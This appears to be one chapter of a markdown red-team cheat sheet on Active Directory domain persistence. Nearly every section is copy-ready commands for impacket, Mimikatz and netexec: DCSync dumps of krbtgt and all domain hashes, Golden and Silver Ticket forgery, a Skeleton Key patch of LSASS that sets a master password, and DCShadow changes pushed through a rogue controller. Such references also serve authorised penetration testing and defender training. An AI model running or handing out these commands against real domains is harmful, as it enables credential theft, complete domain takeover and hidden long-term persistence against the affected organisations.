# 11 — Domain Persistence

[← Back to index](README.md)

## 11.1 Golden Ticket

A Golden Ticket is a forged Kerberos TGT signed with the krbtgt account's NTLM hash. It
grants access to any resource in the domain as any user — even after password changes
(until the krbtgt hash is rotated twice).

```bash
# PREREQUISITES: krbtgt NTLM hash + Domain SID

# Get krbtgt hash (DCSync)
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc-user krbtgt
```

```powershell
.\Mimikatz.exe 'lsadump::dcsync /domain:corp.local /user:krbtgt' exit
```

```bash
# Get Domain SID
impacket-lookupsid $DOMAIN/$USER:$PASS@$DC_IP | grep 'Domain SID'
```

```powershell
Get-DomainSID    # PowerView
whoami /user     # Remove last -XXXX RID to get domain SID
```

```bash
# Create Golden Ticket (Impacket — Linux)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass $DOMAIN/Administrator@$DC_IP
```

```powershell
# Create Golden Ticket (Mimikatz — Windows)
.\Mimikatz.exe \
    'kerberos::golden /user:Administrator /domain:corp.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt' exit
```

```bash
# Golden ticket with SID history (for inter-forest trust)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain $DOMAIN \
    -extra-sid ENTERPRISE_ADMIN_SID Administrator
```

```powershell
# Verify
klist
dir \\$DC_HOST\C$   # Access DC's C$ share
```

## 11.2 Silver Ticket

A Silver Ticket is a forged TGS (service ticket) signed with the target service account's
NTLM hash. More stealthy than a Golden Ticket — no DC contact needed.

```text
# PREREQUISITES: Target service account NTLM hash + Domain SID + Service SPN

# Common service SPNs:
#   cifs/DC01.corp.local      - SMB file access
#   host/DC01.corp.local      - WMI, scheduled tasks, WinRM
#   ldap/DC01.corp.local      - LDAP queries, DCSync
#   http/WEB01.corp.local     - IIS web app
#   MSSQLSvc/SQL01:1433       - SQL Server
```

```bash
# Create Silver Ticket (Impacket)
impacket-ticketer -nthash SERVICE_ACCOUNT_HASH -domain-sid DOMAIN_SID \
    -domain $DOMAIN -spn cifs/DC01.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass $DOMAIN/Administrator@DC01.corp.local
```

```powershell
# Create Silver Ticket (Mimikatz)
.\Mimikatz.exe \
    'kerberos::golden /user:Administrator /domain:corp.local /sid:DOMAIN_SID /target:DC01.corp.local /service:cifs /rc4:SERVICE_HASH /ptt' exit
```

```bash
# Silver ticket for LDAP (DCSync without going through DC's auth!)
impacket-ticketer -nthash DC_MACHINE_ACCOUNT_HASH -domain-sid DOMAIN_SID \
    -domain $DOMAIN -spn ldap/DC01.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass $DOMAIN/Administrator@DC01.corp.local -just-dc
```

## 11.3 DCSync Attack

```bash
# DCSync replicates data from DC (requires DA, or DCSync rights explicitly granted)
# Required rights: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All

# Impacket secretsdump DCSync
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc-ntlm
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc-user Administrator
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc-user krbtgt
```

```powershell
# Mimikatz DCSync
.\Mimikatz.exe 'lsadump::dcsync /domain:corp.local /user:krbtgt' exit
.\Mimikatz.exe 'lsadump::dcsync /domain:corp.local /user:Administrator' exit
.\Mimikatz.exe 'lsadump::dcsync /domain:corp.local /all /csv' exit
```

```bash
# Netexec
nxc smb $DC_IP -u $USER -p $PASS --ntds
nxc smb $DC_IP -u $USER -p $PASS --ntds vss

nxc smb $DC_IP -u $USER -H $HASH --ntds
```

## 11.4 Skeleton Key

```powershell
# Skeleton Key patches LSASS on DC — allows ANY user to auth with a master password.
# Requires DA and access to DC.
.\Mimikatz.exe 'privilege::debug' 'misc::skeleton' exit

# Now ANY account can authenticate with password: 'mimikatz'
# Test: login to any machine with any AD account using 'mimikatz' as password
net use \\DC01\C$ /user:DOMAIN\Administrator mimikatz

# Note: Skeleton key is lost on DC reboot / LSASS restart
```

## 11.5 DCShadow

```powershell
# DCShadow: Register a rogue DC, push changes without logging. Requires DA.

# Terminal 1 — Start DCShadow (minimized, runs in background)
.\Mimikatz.exe 'lsadump::dcshadow /object:target_user /attribute:description /value:hacked' exit

# Terminal 2 — Push changes
.\Mimikatz.exe 'lsadump::dcshadow /push' exit

# More dangerous: modify userAccountControl or SIDHistory
.\Mimikatz.exe 'lsadump::dcshadow /object:target_user /attribute:userAccountControl /value:532480' exit
```

---

[← Prev: 10 — Pivoting & Tunneling](10-pivoting-and-tunneling.md) | [Next: 12 — Forest & Trust Attacks →](12-forest-and-trust-attacks.md)
